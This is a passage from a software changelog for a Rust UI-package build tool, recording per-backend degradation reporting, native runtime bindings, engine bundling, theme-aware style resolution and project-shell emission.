emitter itself with a named message, it just isn't reflected as a
separate degradation code (matching how `HostSlider`'s own arm doesn't
distinguish authored prop combinations either).

## [Unreleased] - degradation plumbing for the `Path` kernel drawing primitive (#12028 item 3)

Added the `("Path", ...)` arm to `collect_native_degradations`, following
`HostSwitch`'s lifecycle exactly: unconditionally degraded (code
`primitive.path-unimplemented`) on every native backend the moment the
primitive is registered, since none renders it yet. As each backend lands a
real lowering (XAML first, immediately following this), narrow the arm's
`is_native()` guard with a `!matches!(backend, ...)` exclusion the same way
the existing `HostSlider` arm already does. See
`code/specs/UI39-mosaic-drawing-primitive.md`.

## [Unreleased] - gate the radio-group degradation on actual native support (#13007)

`mosaic-emit-compose`/`-flutter`/`-qt` now apply real mutual-exclusion
wiring (`selectableGroup`/synthesized `groupValue`/`ButtonGroup`) for a
literal `HostRadio.group` value shared by 2+ resolvable siblings.
Changed the `("HostRadio", "group")` match arm in
`ignored_native_property` to check a new `native_radio_groups:
&HashSet<String>` parameter — the set of literal group values that get
real wiring on the current backend — computed once per component (from
the whole layout tree, since the recursive degradation walk only ever
sees one node at a time and can't discover a node's siblings on its
own) via each backend's new `radio_groups_with_native_semantics`, and
threaded through `collect_native_degradations`'s recursion alongside
the existing `backend`/`component`/`variant` parameters. SwiftUI has no
idiomatic ancestor-grouping widget for N independently-bound `Toggle`s
and is deliberately excluded from this gating — it stays unconditionally
degraded (tracked as a follow-up). A `slot:`-bound group, or a literal
value with no qualifying peer, still reports the degradation on every
backend exactly as before.

Added `literal_radio_group_with_two_siblings_is_native_on_compose_flutter_qt_not_swiftui`,
covering the real `mosaic-pkg-deck-options`-shaped fixture (2 sibling
radios, one shared literal group) across all 5 backends.

## [Unreleased] - gate the checkbox-indeterminate degradation on actual native support (#13006)

`mosaic-emit-compose`/`-flutter`/`-swiftui` now lower `HostCheckbox`'s
`indeterminate:` to real native tri-state controls (#13006). Changed
the `("HostCheckbox", "indeterminate")` match arm in
`ignored_native_property` to call each backend's new
`host_checkbox_has_native_semantics` predicate (mirroring the existing
`host_table_has_native_semantics`/`host_dialog_has_native_semantics`
pattern), so `property.checkbox-indeterminate-ignored` is only reported
when the authored value is a shape none of the three emitters actually
act on (in practice, never — the toolkit's `Checkbox` component only
ever authors a `slot:`-bound value) rather than unconditionally for
every non-`false` `indeterminate` on these three backends.

Updated `native_degradation_analysis_reports_ignored_checkbox_and_radio_properties`'s
expected-degradations matrix: Compose/Flutter/SwiftUI now collapse to
just the still-open `property.radio-group-ignored` entry (#13007),
matching Qt's existing shape, and the strict-mode `degradation_count`
assertion for Compose drops from 2 to 1.

## [Unreleased] - gate Flutter's HostDialog degradation on the actual gap (#13010)

`mosaic-emit-flutter` now implements a real native dialog for `HostDialog`'s
default `modal: true` shape (#13010) — only `modal: false` still falls
back to a placeholder. Changed the `("HostDialog", backend == Flutter)`
match arm in `ignored_native_property` to call the new
`mosaic_emit_flutter::pipeline::host_dialog_has_native_semantics`
predicate, mirroring the existing `host_table_has_native_semantics`
pattern, so `interaction.dialog-placeholder` is only reported for the
genuinely-still-degraded `modal: false` case rather than unconditionally
for every `HostDialog` on Flutter.

## [Unreleased] - document HostDialog's XAML open-host-required gap as permanent (#13008)

Added a doc comment above the `("HostDialog", "open")` arm in
`ignored_native_property` recording that this degradation is confirmed
permanent, not an open TODO: WinUI3's `ContentDialog` has no bindable
`IsOpen`-style property the way `Popup`/`Flyout`/`TeachingTip` do, so
there's no declarative show/hide surface for the XAML emitter to bind
`open:` to — unlike SwiftUI/Qt/Compose, whose dialog primitives are all
natively declarative. No behavior change; the degradation code and
message are unchanged. Closes #13008.

## [Unreleased] - report dropped style properties, non-gating (#12022)

- New `DegradationReport::style_degradations` field (`styleDegradations` in
  `mosaic-degradations.json`), populated for the XAML backend by calling the
  new `mosaic_emit_xaml::pipeline::dropped_style_properties` per
  component/variant, right alongside the existing `collect_native_degradations`
  layout walk.
- Deliberately a separate field from `degradations`, not merged in:
  `native_complete`/the `NativeComplete` profile gate are computed from
  `degradations` alone and are completely unaffected. Regenerating the
  package-expanded TaskApp's XAML report locally shows *why* this matters —
  166 style properties are now visible for the first time (`box-shadow`,
  absolute positioning, per-side border shorthands, `transform`, and more),
  and several of them (30 `box-shadow` uses, 2 `border-style: dashed`) are
  real, already-shipped gaps in TaskApp's own stylesheet. Folding them into
  the gating list today would break the currently-green `native-complete`
  CI job for TaskApp and `mosaic-pkg-rating-controls`. This PR ships full
  detection + reporting (the invisible-failure-class problem #12022
  describes is fully fixed — nothing vanishes without a record anymore);
  the hard-fail is deferred until those gaps are addressed. See #12022 for
  the follow-up.
- Scoped to XAML only. SwiftUI/Compose/Qt/Flutter's own style lowering
  hasn't been audited and gains no degradations from this change.
- New tests: a `box-shadow` declaration on XAML is reported in
  `styleDegradations` while `degradations`/`nativeComplete` stay unaffected
  (`xaml_style_drop_is_reported_but_not_gating`); the same style on a
  non-XAML backend produces zero `styleDegradations`
  (`non_xaml_backend_does_not_report_style_drops`).

## [Unreleased] - HostSwitch capability tracking

- Native-complete analysis reports `primitive.switch-unimplemented` on every
  native backend until its real switch lowering ships.
- This keeps newly registered `HostSwitch` packages from being mislabeled as
  native-complete or silently lowered as checkboxes while emitter work proceeds.

## [Unreleased] - all-five-native HostSlider capability

- Native-complete analysis now accepts `HostSlider` on XAML after its native
  WinUI adjustable range-control lowering.
- `HostSlider` is now native-complete on Compose, Flutter, Qt, SwiftUI, and
  XAML; packages no longer need backend-specific slider implementations.

## [Unreleased] - SwiftUI HostSlider capability

- Native-complete analysis now accepts `HostSlider` on Compose, Flutter, Qt,
  and SwiftUI after their real adjustable range-control lowerings, while
  continuing to report `primitive.slider-unimplemented` on XAML.
- This keeps newly registered `HostSlider` packages from being mislabeled as
  native-complete while emitter work proceeds one backend at a time.

## [Unreleased] - default authored-child package expansion

- Package references splice their default inline MLL child block into a typed
  `node`/`list<node>` mount before backend emission.
- One acceptance fixture proves the expanded tree remains `native-complete` on
  SwiftUI, Qt/QML, XAML, Flutter, and Compose.
- A surviving child mount receives the stable
  `composition.child-slot-parameter-unimplemented` degradation, keeping direct
  standalone component artifacts honest until backend child parameters land.

## [Unreleased] - portable Text accessibility capability

- Native-complete analysis accepts the cross-backend `Text` contract for
  literal or slot-backed accessible names, heading/none roles, and static
  hidden state.
- Unsupported label forms, text roles, and dynamic hidden state now produce
  stable property-level degradation codes instead of being silently ignored.

## [Unreleased] - application token palettes

- Added token-aware composition and package-build entry points.
- One override map now applies to root and recursively referenced package
  styles, enabling reusable components to inherit app branding.
- Package manifests may declare scoped token defaults. Dependency palettes are
  lower precedence than consuming-package palettes, while explicit application
  input wins last; project-shell and degradation-analysis paths use the same
  resolved palette.
- Existing build and composition APIs retain the built-in Mosaic palette.

## [Unreleased] - XAML native drag capability

- Native-complete analysis recognizes XAML `HostDraggable` and
  `HostDropTarget` now that the emitter supplies native pointer, touch,
  keyboard, acceptance, lifecycle, RTL, and accessibility behavior.
- The package-expanded TaskApp now reports zero XAML degradations and can be
  emitted under the strict `native-complete` profile.

## [Unreleased] - XAML native table capability

- Native-complete analysis recognizes the canonical indexed UI31/Grid shape
  when the XAML emitter supplies native UIA Table/Grid and
  TableItem/GridItem provider patterns.
- Unsupported or structurally ambiguous XAML HostTable trees retain the stable
  `accessibility.table-semantics-missing` degradation.
- Concrete TaskApp XAML output retained four drag/drop paths at this historical
  milestone; the native drag capability above subsequently closes them.

## [Unreleased] - selected runtimes are required

- Passing `--runtime-library` now emits a runtime-required native shell even
  under the permissive degradation-reporting profile. This removes the sample
  fallback without suppressing unrelated capability reports, allowing XAML
  TaskApp to bundle its concrete engine while its drag/drop gaps remain explicit.

## [Unreleased] - SwiftUI native table capability

- Native-complete analysis recognizes the canonical dynamic UI31/Grid shape
  when the SwiftUI emitter supplies native `Table` / `TableColumnForEach`
  semantics and the version-gated `List` fallback.
- Unsupported or structurally ambiguous SwiftUI HostTable trees retain the
  stable `accessibility.table-semantics-missing` degradation.
- Permissive TaskApp SwiftUI output now reports only the sample-runtime
  fallback before compiling on both macOS and the iOS 16 deployment target.

## [Unreleased] - SwiftUI native drag capability

- Native-complete analysis no longer reports SwiftUI `HostDraggable` and
  `HostDropTarget` nodes as inert now that the emitter supplies native pointer,
  touch, keyboard, acceptance, lifecycle, RTL, and accessibility behavior.
- TaskApp's SwiftUI degradation report now retains only the separate native
  table-semantics gap plus permissive-shell fallback when applicable.

## [Unreleased] - Qt native table capability

- Native-complete analysis recognizes the canonical UI31/Grid structure when
  the Qt emitter supplies `TableView`, `HorizontalHeaderView`, and a generated
  `QAbstractTableModel` adapter.
- Unsupported or structurally ambiguous Qt HostTable trees retain the stable
  `accessibility.table-semantics-missing` degradation.
- Permissive TaskApp Qt acceptance now reports only the sample-runtime fallback
  before compiling and launching the generated native application.

## [Unreleased] - Qt native drag capability

- Native-complete analysis no longer reports Qt `HostDraggable` and
  `HostDropTarget` nodes as inert now that the emitter supplies native pointer,
  touch, keyboard, acceptance, lifecycle, RTL, and accessibility behavior.
- Complete TaskApp Qt acceptance now requires exactly the remaining table
  semantics degradation plus the permissive sample-runtime fallback, then
  compiles and launches the generated native application headlessly.

## [Unreleased] - analyzer-clean Flutter project bootstrap

- Flutter project shells install Mosaic-owned `analysis_options.yaml` and
  `test/widget_test.dart` files alongside the matching lint dependency.
- The generated smoke test imports the actual pub package name and replaces
  Flutter's stock `MyApp` counter test before `flutter create` adds runners.
- Package artifacts now report both bootstrap files to callers.

## [Unreleased] - Flutter Rust engine bundling

- Flutter project shells accept a selected target Rust cdylib, copy it under
  Mosaic's conventional name, and register it through a generated stable Dart
  build hook as a bundled code asset.
- Strict Flutter builds report `runtime.library-not-bundled` and stop before
  application emission when no engine was selected.
- Native acceptance builds the generated Flutter app, verifies the installed
  engine, and runs the standard binding conformance without
  `MOSAIC_APP_LIBRARY`.

## [Unreleased] - SwiftUI Rust engine bundling

- SwiftUI project shells accept a selected target Rust dylib and copy it into
  the SwiftPM `Runtime` resource bundle under Mosaic's conventional name.
- Strict SwiftUI builds report `runtime.library-not-bundled` and stop before
  application emission when no engine was selected.
- macOS acceptance verifies the bundled bytes and runs the standard binding
  conformance through the app-local path without `MOSAIC_APP_LIBRARY`.

## [Unreleased] - XAML Rust engine bundling

- XAML project shells accept a selected target Rust DLL, install it as
  `mosaic_app.dll`, and use the existing MSBuild native-library copy target to
  place it beside the WinUI executable.
- Strict XAML builds report `runtime.library-not-bundled` and stop before
  application emission when no engine was selected.
- Windows acceptance verifies the copied engine hash and runs the exact .NET
  binding conformance from its output directory without `MOSAIC_APP_LIBRARY`.

## [Unreleased] - Qt Rust engine bundling

- Qt project shells accept the selected target Rust engine, copy it beside the
  built executable, and include it in the CMake install tree under Mosaic's
  conventional runtime filename.
- Strict Qt installable builds report `runtime.library-not-bundled` and stop
  before application emission when no engine was selected.
- Linux acceptance verifies the installed library bytes, launches the generated
  native QML app, and runs the exact Qt binding conformance from the install
  directory without `MOSAIC_APP_LIBRARY`.

## [Unreleased] - Compose Rust engine bundling

- Add a target-library-aware profiled build API. Compose project shells copy a
  selected `.dylib`, `.so`, or `.dll` into the platform-specific application
  resources under Mosaic's conventional runtime filename.
- Strict Compose distributable builds now report
  `runtime.library-not-bundled` and stop before application emission when no
  engine was selected.
- Native packaging acceptance composes the shared Rust engine with a real
  Mosaic package, verifies the installed library bytes, and exercises the
  app-relative loader without `MOSAIC_APP_LIBRARY`.

## [Unreleased] - Compose native drag capability

- Native-complete analysis no longer reports Compose `HostDraggable` and
  `HostDropTarget` nodes as inert now that the emitter supplies native pointer,
  keyboard, acceptance, lifecycle, RTL, and accessibility behavior.
- SwiftUI and XAML retain the stable `interaction.drag-drop-inert`
  degradation until their native implementations land.

## [Unreleased] - Compose native table capability

- Native-complete analysis recognizes the canonical UI31/Grid shape as a
  semantic Compose collection now that the emitter publishes table dimensions,
  heading metadata, and per-cell row/column coordinates.
- Unsupported or structurally ambiguous Compose HostTable trees retain the
  stable `accessibility.table-semantics-missing` degradation.
- The complete package-expanded TaskApp is now a zero-degradation strict
  Compose build and is packaged as a native desktop application in CI.

## [Unreleased] - Flutter native table capability

- Native-complete analysis recognizes the canonical UI31/Grid shape as a
  semantic Flutter table now that the emitter produces `DataTable`/
  `DataColumn`/`DataRow`/`DataCell` widgets.
- Unsupported or structurally ambiguous Flutter HostTable trees retain the
  stable `accessibility.table-semantics-missing` degradation.
- The complete package-expanded TaskApp is now a zero-degradation strict
  Flutter build and is compiled as a native desktop application in CI.

## [Unreleased] - Flutter native drag capability

- Native-complete analysis no longer reports Flutter `HostDraggable` and
  `HostDropTarget` nodes as inert now that the emitter supplies native
  pointer/touch, keyboard, acceptance, lifecycle, and accessibility behavior.
- SwiftUI and XAML retain the stable
  `interaction.drag-drop-inert` degradation until their native implementations
  land.

## [Unreleased] - ignored native dialog and link contract inventory

- Native-complete analysis now rejects XAML dialogs whose open state still
  requires application code-behind, XAML's unsupported no-dismiss policy, and
  ignored dialog lifecycle events in XAML and SwiftUI.
- External `HostLink.onActivate` event loss in XAML and SwiftUI is now reported
  at the exact package-expanded property path. Supported internal-link dispatch
  and SwiftUI modal-close shapes remain clean.

## [Unreleased] - complete Flutter package source set

- Generated Flutter project shells now copy every exported widget into `lib/`
  while continuing to mount the first export as the application entry widget.
- Whole-package Dart analysis can no longer miss a broken sibling component
  that was emitted only as a top-level distribution artifact.

## [Unreleased] - complete Qt package QML module

- Generated Qt project shells now list every exported QML component in
  `qt_add_qml_module` while continuing to mount the first export.
- Whole-package Qt compilation can no longer miss a broken sibling QML file.

## [Unreleased] - complete SwiftUI package source set

- Generated SwiftUI project shells now copy every exported view into the
  SwiftPM application target while continuing to mount the first export.
- Whole-package Swift compilation can no longer miss a broken sibling view
  that was emitted only as a top-level distribution artifact.

## [Unreleased] - complete Compose package source set

- Generated Compose project shells now copy every exported component into the
  Gradle Kotlin source set while continuing to mount the first export as the
  application entry component.
- Whole-package Kotlin compilation can no longer miss a broken sibling
  component that was emitted only as a top-level distribution artifact.

## [Unreleased] - ignored native control property inventory

- Native-complete analysis now reports stable, property-level degradations for
  tri-state checkbox state ignored by Compose, Flutter, and SwiftUI, and radio
  grouping ignored by Compose, Flutter, Qt, and SwiftUI.
- Strict builds reject those authored behavior losses before emitting app
  artifacts. Explicit `indeterminate: false` remains a clean semantic no-op.

## [Unreleased] - native-complete Qt runtime shell

- Qt project shells emitted under `BuildProfile::NativeComplete` now require
  Mosaic's standard QObject runtime binding and validate required MIL props
  before QML construction.
- Strict Qt shells remove conditional binding compilation and nullable event
  dispatch, while mapping Rust MIL prop names to generated QML member names.
- Linux CI compiles a zero-degradation strict Qt package and exercises normal,
  missing-prop, and missing-runtime conformance paths.

## [Unreleased] - native-complete XAML runtime shell

- XAML project shells emitted under `BuildProfile::NativeComplete` now require
  Mosaic's standard .NET runtime binding before WinUI activation and validate
  required MIL props before showing the component.
- Strict XAML shells omit the reflection host, generated sample props, and
  app-owned dispatch stubs while permissive output remains backward-compatible.
- Windows CI compiles a zero-degradation strict WinUI package and exercises the
  required-runtime success and missing-runtime paths.

## [Unreleased] - native-complete SwiftUI runtime shell

- SwiftUI project shells emitted under `BuildProfile::NativeComplete` now
  require Mosaic's standard Foundation/C runtime binding and its initial props
  before mounting the generated view.
- Strict SwiftUI shells omit reflection-host, event-print, and generated sample
  paths while permissive output remains backward-compatible.
- macOS runtime CI builds a zero-degradation strict SwiftPM project in addition
  to round-tripping the standard binding.

## [Unreleased] - native-complete Flutter runtime shell

- Flutter project shells emitted under `BuildProfile::NativeComplete` now
  require Mosaic's standard Dart FFI runtime and the first props envelope before
  mounting the generated widget.
- Strict Flutter shells omit nullable-host, event-print, and generated sample
  paths while permissive output remains backward-compatible.
- Flutter runtime CI now analyzes a zero-degradation strict project in addition
  to round-tripping the standard binding.

## [Unreleased] - native-complete Compose runtime shell

- Compose project shells emitted under `BuildProfile::NativeComplete` now
  require Mosaic's standard Rust runtime and a complete props envelope before
  mounting the generated component.
- Strict Compose shells omit the package-owned reflection bridge, event-print
  fallback, and generated sample values for required props. Permissive output
  retains those preview and compatibility paths.
- Compose runtime CI now compiles a zero-degradation strict project in addition
  to round-tripping the standard JNA binding.

## [Unreleased] - native-complete package profile

- Added deterministic package-expanded degradation analysis and the
  `mosaic-degradations.json` build artifact.
- Added `BuildProfile::Permissive` and `BuildProfile::NativeComplete`; strict
  builds reject known degradations before emitting application artifacts.
- Seeded the capability inventory with documented native drag/drop, table
  semantics, Flutter dialog/link, and generated sample-runtime gaps.

## [Unreleased] - shared package composition

- Added `compose_component` and `compose_component_with_model` as the canonical
  MIL/MLL/MSL composition API: qualified layouts are resolved and dependency
  styles are merged before backend emission.
- Package component artifacts and generated project shells now consume that
  shared result instead of maintaining duplicate compilation pipelines.

## [Unreleased] - reproducible XAML SDK selection

- XAML package shells now preserve the emitter's `global.json`, keeping WinUI
  project builds on the .NET 9 SDK family they target when newer SDKs are also
  installed.

## [Unreleased] - standard Qt Rust runtime binding

- Qt project shells now install Mosaic's package-independent QObject binding
  and connect it through the existing QML host seam.
- Explicit package host assets retain precedence for specialized integrations.

## [Unreleased] - standard Flutter Rust runtime binding

- Flutter project shells now install Mosaic's package-independent Dart FFI
  binding instead of the no-op default host.
- The standard host owns startup, successful event sequencing, snapshots,
  buffers, prop updates, and teardown while preserving injectable custom hosts.

## [Unreleased] - standard XAML Rust runtime binding

- XAML project shells now install Mosaic's package-independent .NET binding and
  prefer it over legacy package-owned `MosaicHost` adapters when the Rust DLL is
  available.
- The standard host uses `NativeLibrary` and `System.Text.Json` to own startup,
  successful event sequencing, prop projection, snapshots, buffers, and teardown.

## [Unreleased] - standard SwiftUI Rust runtime binding

- SwiftUI package shells now install Mosaic's package-independent Foundation/C
  binding and prefer it over legacy package-owned `MosaicHost` adapters.
- The generated C target dynamically resolves the fixed Rust application ABI,
  while the Swift host owns startup, event sequencing, snapshots, buffers, and
  runtime teardown without app-authored platform glue.

## [Unreleased] - standard Compose Rust runtime binding

- Compose Desktop project shells now install Mosaic's package-independent JNA
  binding and prefer it over legacy package-owned `MosaicHost` adapters.
- The generated shell closes its host on disposal, releasing the opaque Rust
  runtime handle and every returned Rust buffer through the fixed C ABI.

## [Unreleased] - reactive Compose native host bridge

- Compose Desktop project shells now subscribe to optional host prop-change
  callbacks, allowing native content-surface interactions to reproject chrome
  without duplicating state in generated UI.
- Compose shells include pinned JNA and JSON runtime dependencies for
  package-owned native host adapters.

## [Unreleased] - keep web test assets out of production

- HTML and Web Component `.test.*` / `.spec.*` host assets are copied without
  being injected as production page modules, matching the existing React host
  asset rule.

## [Unreleased] - runnable host-surface shell acceptance

- Compose Desktop project shells now resolve `node` slots from an optional
  in-process `MosaicHost` props map as composable lambdas.
- Venture's exhaustive `Backend::ALL` gate now verifies both the generated
  component mount and the runnable project-shell host-injection path for all
  nine backends.

## [Unreleased] - exhaustive Venture backend acceptance

- Added `Backend::ALL` as the MIL/MLL/MSL package pipeline's backend source of
  truth.
- Venture's shared browser package now builds a project shell and proves a real
  `HostSurface` mount across every listed backend, including Qt.

## [Unreleased] - preserve XAML emitter support files

XAML package builds now write emitter-owned C# support files, report them in
`BuildResult.artifacts`, and include them in `MosaicPackage.props`. Generated
ViewModels and value converters referenced by component XAML therefore travel
through the same package pipeline as the component triple.

## [Unreleased] - theme axis for style resolution

`BuildOptions` gains a `theme: Option<String>` field — the style (`.msl`)
analogue of the UI30 layout `variant` axis. When `Some("light")`, each
component's style resolves from `<Component>.light.msl` (falling back to the
bare `<Component>.msl`, then the alphabetically-first stylesheet). `None`
preserves the historical theme-agnostic resolution (bare, else
alphabetically-first — the implicit dark default).

Before this, `resolve_style_path` was theme-blind: it picked the bare `.msl`
or the alphabetically-first `<Component>.*.msl`, so `<Component>.dark.msl`
always beat `<Component>.light.msl` and any authored light stylesheet was
**dead code, never emitted**. The theme flows through `compile_one_component`,
`emit_project_shell`, and the dependency-style collection chain, so app styles,
component styles, and nested package-dependency styles all honour the selected
theme. `mosaic-compile pkg` exposes it as `--theme <name>`.

`build_package` validates `opts.theme` as a safe path segment (non-empty ASCII
alphanumeric / `_` / `-`) before any I/O, since the theme flows into a
stylesheet filename joined onto `src/`. The check lives in the library (not just
the `mosaic-compile` CLI) so programmatic callers can't traverse out of `src/`.

**Breaking:** `BuildOptions` now has a required `theme` field. All in-tree
constructors are updated (`None` = prior behaviour).

## [Unreleased] - package reference aware artifact builds

`build_package` now resolves `pkg::P::C` layout references before style
compilation and backend emission, using the shared `mosaic-package-resolver`
layout inliner. This lets app packages compose reusable component packages and
still emit backend artifacts from one app source tree.

`build_package` now installs backend-matching host assets declared in
`mosaic-package.toml` under `[host_assets]`, copying source files from the
package root into the emitted backend project after project-shell generation.
Manifest asset paths are validated to stay relative to the package/output root.
Generated HTML project shells automatically load copied JavaScript module host
assets before `main.js`, and generated React project shells automatically import
copied source-module host assets from `src/main.tsx`.

Package builds now write non-empty merged Mosaic styles as `<Component>.lattice`
sidecars beside each emitted component artifact and include those sidecars in
`BuildResult.artifacts`.

Dependency package styles are now compiled and merged into the consuming
component artifact before backend emission. Dependency styles are applied first
and the consuming component's own style is applied last, so parent/app packages
can intentionally override a named part while keeping default package styling.

The builder also now honors themed style fallbacks such as
`<Component>.dark.msl` when `<Component>.msl` is absent.

Electron project shells now delegate `mosaic:get-props` and
`mosaic:handle-event` IPC calls to an optional host module (`electron/host.ts`
compiled to `dist-electron/host.js`, source-side `electron/host.js` or
`electron/host.mjs`, or `MOSAIC_ELECTRON_HOST_MODULE`) instead of hardcoding
no-op responses. Their generated `npm run dev` script now compiles the Electron
main/preload TypeScript before launching Electron, so a fresh emitted project is
runnable without a separate build.

`BuildOptions::emit_project` now writes XAML project shells through
`mosaic-emit-xaml` as well, producing `<Component>.csproj`, `App.xaml`,
`MainWindow.xaml`, `app.manifest`, `build.ps1`, and README side files beside
the package's component XAML triple and `MosaicPackage.props` fragment.

`Backend::Compose` is now wired through package builds, emitting per-component
`.kt` files, a lightweight `index.kt`, and a README for adding the generated
sources to Android, Desktop, or Compose Multiplatform source sets.

All notable changes to `mosaic-package-artifact-builder` will be documented
in this file.

## [Unreleased] — UI32-M — multi-backend project-shell emission

L8 of UI32 ([spec PR #4286](https://github.com/adhithyan15/coding-adventures/pull/4286); L2-L7: #4297, #4309, #4315, #4319, #4325, #4326). Adds `BuildOptions::emit_project: bool` so `build_package` produces a per-backend runnable project shell alongside the per-component artifacts.

`mosaic-compile pkg --backend <X> --emit-project --output dist <package>` now writes the same shell side-files the single-component `mosaic-compile --backend <X> --emit-project` path produces (L2-L7 PRs), with the package's first component mounted as the shell root.

New API:

- `pub struct BuildOptions { ..existing.., emit_project: bool }`
- `fn emit_project_shell(component, src_dir, backend_dir, backend) -> Result<Vec<PathBuf>, BuildError>` — re-parses the first component's `.mil`/`.mll`/`.msl` triple and routes through the matching emitter's `from_pipeline_with_options(emit_project: true)`. Writes the resulting `ProjectFiles` into `backend_dir` at the fixed §2.2 paths.

Per-backend dispatch covers React, HTML, WebComponent, Flutter, Qt, SwiftUI, and XAML. XAML shells reuse `mosaic-emit-xaml`'s `EmitOptions::emit_project` path and are written by the artifact-builder beside the component triple.

**v1 scope (documented deviation):** only the FIRST component in `[components].exports` is mounted as the shell root. Per UI32 spec §5 open question 1's first-export-default policy. Multi-component routing/tabs UI (TabView on SwiftUI, MaterialApp routes on Flutter, etc.) is deferred to UI32-M.1.

5 new tests cover:

- `ui32_m_emit_project_false_does_not_emit_shell_side_files` (§3.4 back-compat)
- `ui32_m_emit_project_true_writes_react_vite_shell` (positive: full L2 shell present, banner intact, artifacts list includes shell files)
- `ui32_m_emit_project_true_produces_expected_shell_per_backend` (cross-backend: 7 backends × expected file enumeration)
- `ui32_m_emit_project_true_xaml_writes_project_shell` (positive: full WinUI host shell present)
- `ui32_m_emit_project_shell_is_byte_deterministic` (§3.1 across two tmpdir runs)

All 33 existing tests + 1 doctest pass unchanged. Total tests: 38 (was 33, +5).

The existing 25+ `BuildOptions { ... }` construction sites in tests + the module doctest were updated to add `emit_project: false`.

## [Unreleased] — UI31-M Phase 3 multi-component HTML shell

`build_package` for `Backend::Html` now writes a second index file
alongside the existing bare `index.html`:

- **`html/index-shell.html`** — a complete `<!DOCTYPE html>` document
  that inlines every component's emitted `.html` fragment inside a
  `<section data-component="X">` block. Opening it in a browser
  shows the whole package laid out top-to-bottom; no demo-side
  boilerplate required.

This eats the shell that today's VC2-html demo hand-writes (the
demo's `index.html` currently inlines a hand-written `<table>` for
Grid because the Mosaic pipeline didn't produce a mountable HTML
shell). With this change the demo's wrapper can be replaced by
the auto-generated `index-shell.html`.

Back-compat: the bare `index.html` (a comment-only manifest of
components) is unchanged. Any tool already consuming it sees no
diff. The new file is additive.

Scope note: this PR ships only the HTML shell. The matching
WebComponent shell (`webcomponent/index.html` that loads the
existing `index.js` and instantiates `<mosaic-{name}>` per
component) and the XAML `MainWindow.xaml` shell are queued for a
follow-up PR — same pattern, different per-backend output shape.

1 new test (`html_backend_writes_multi_component_index_shell_in_addition_to_bare_index`).
Total tests: 33 (was 32).

## [Unreleased] — UI30 multi-layout variant enumeration (ML2)

`build_package` now emits one artifact per (component, variant, backend)
tuple. Implementation follows UI30 spec §5: filesystem is the source
of truth. A new `discover_variants()` helper scans the package's
`src/` for `<Component>.<variant>.mll` files and the builder loops
over the discovered variants.

### Filename convention

- **Default variant** (bare `<Component>.mll` exists): output is the
  unsuffixed `<Component>.<ext>` — same name as pre-UI30 builds.
- **Named variants** (`<Component>.touch.mll` etc.): output is
  `<Component>.<variant>.<ext>`. The variant infix lands between the
  component name and the file extension so multiple variants coexist
  in one output directory without collision.

For XAML this means a single component can emit:
```
Grid.xaml          Grid.touch.xaml          (default + variant XAML)
Grid.xaml.cs       Grid.touch.xaml.cs       (matching code-behinds)
Grid.Event.cs      Grid.touch.Event.cs      (matching event unions)
```

### Back-compat clause

Every existing package — toolkit, dialog, the ones with one
`.mll` per component — builds byte-for-byte identically.
`discover_variants` returns `[None]` for a component with only a
bare default, the loop runs once, and the artifact filename is
unsuffixed exactly as before. Eight new tests cover this back-compat
path explicitly.

### Out of scope for this PR

The UI30 spec's `[variants]` manifest section (with `all` /
`overrides` / `fallback` keys) is **not** parsed here. Filesystem
discovery is sufficient for the "ship everything you authored"
default policy; manifest declarations are only needed when a
package wants to *constrain* which variants get built. Follow-up
PR will extend `mosaic-package-manifest` to parse the section and
wire it into the builder.

The variant-aware index file (mounting `Grid.desktop` and
`Grid.touch` as separate exports in the React/HTML/qmldir index)
is also deferred — the index continues to list each component
once, which is correct for the most common runtime-picks-variant
model (host imports either the default or the variant, never both).

### Tests

- `discover_variants_bare_default_only_returns_single_none` —
  back-compat for single-variant packages.
- `discover_variants_default_plus_named_returns_both_in_order`
  — default first, named variants alphabetical.
- `discover_variants_only_named_variants_no_default` — "strict
  mode" packages that omit the bare default.
- `discover_variants_no_mll_files_returns_single_none` —
  degenerate case still triggers the existing SourceNotFound
  error.
- `discover_variants_does_not_cross_pollute_components` — `Grid`
  doesn't pick up `Sidebar.touch.mll`.
- `discover_variants_skips_ambiguous_dotted_middles` —
  `Grid.dark.theme.mll` is rejected (dotted middle can't be a
  clean variant name).
- `build_package_emits_both_default_and_variant_artifacts` —
  end-to-end React build emits both `Grid.tsx` + `Grid.touch.tsx`.
- `build_package_without_variants_is_unchanged_from_pre_ui30` —
  explicit regression guard for the back-compat invariant.

## [Unreleased] — Flutter backend wired

Adds `Backend::Flutter` so userland packages now compile to seven
backends total (the new Flutter target alongside the existing six).

### Added

- `Backend::Flutter` enum variant.
- Dispatch arm in `compile_one_component` calls
  `mosaic_emit_flutter::pipeline::from_pipeline`.
- `index.dart` aggregator that re-exports each component file
  (`export 'X.dart';` per component).
- Minimal `pubspec.yaml` so `flutter pub get` recognises the
  generated directory as a Flutter package. Package name is the
  kebab-case manifest name with `-` rewritten to `_` (Dart's
  package-name convention).
- `flutter_backend_writes_dart_per_component_with_pubspec` test.
- `multi_component_builds_on_all_newer_backends` (renamed from
  `_on_html_webcomponent_xaml`) now also exercises Flutter so a
  regression in any of the four newer backends fails fast.
- New `mosaic-emit-flutter` Cargo dep.

Test count: 23 → 24 passing.

## [Unreleased] — full backend coverage (HTML, WebComponent, XAML)

The first cut shipped React / SwiftUI / Qt and returned
`UnsupportedBackend` for the other three UI29 §4.3 backends. This
update wires HTML, WebComponent, and XAML so userland packages
compile to **all six backends** without per-backend code.

### Added

- New `Backend::Xaml` enum variant. WinUI 3 target; each component
  emits a three-file triple: `{Component}.xaml` (markup),
  `{Component}.xaml.cs` (code-behind partial), and
  `{Component}.Event.cs` (discriminated event union).
- `Backend::Html` now writes `{Component}.html` per component plus
  `index.html` (fragment-shaped aggregator with `<!-- Component:
  X -->` markers).
- `Backend::WebComponent` now writes `{Component}.js` per component
  plus `index.js` (re-imports each component's self-registration via
  `import "./X.js"`).
- `Backend::Xaml` writes a `MosaicPackage.props` MSBuild fragment
  that a host's `.csproj` can `<Import Project="..."/>` to wire
  every component's `.xaml` + `.xaml.cs` + `.Event.cs` into the
  build in one line. Gets the `<DependentUpon>` linkage right so
  Visual Studio nests the partials under the markup file in the
  Solution Explorer.

### Changed

- `Backend::component_extension` now returns `Some(...)` for every
  variant (was `None` for `Html` / `WebComponent`). The `Option`
  shape is preserved so a future "manifest-only" backend can still
  slot in.
- The early-validation guard in `build_package` is kept as a
  future-proof check against adding a new `Backend::Foo` variant
  without wiring `compile_one_component`.
- Cargo deps grew by three: `mosaic-emit-html`,
  `mosaic-emit-webcomponent`, `mosaic-emit-xaml`.

### Removed

- The `webcomponent_backend_is_unsupported` and
  `html_backend_is_unsupported` regression tests (they pinned the
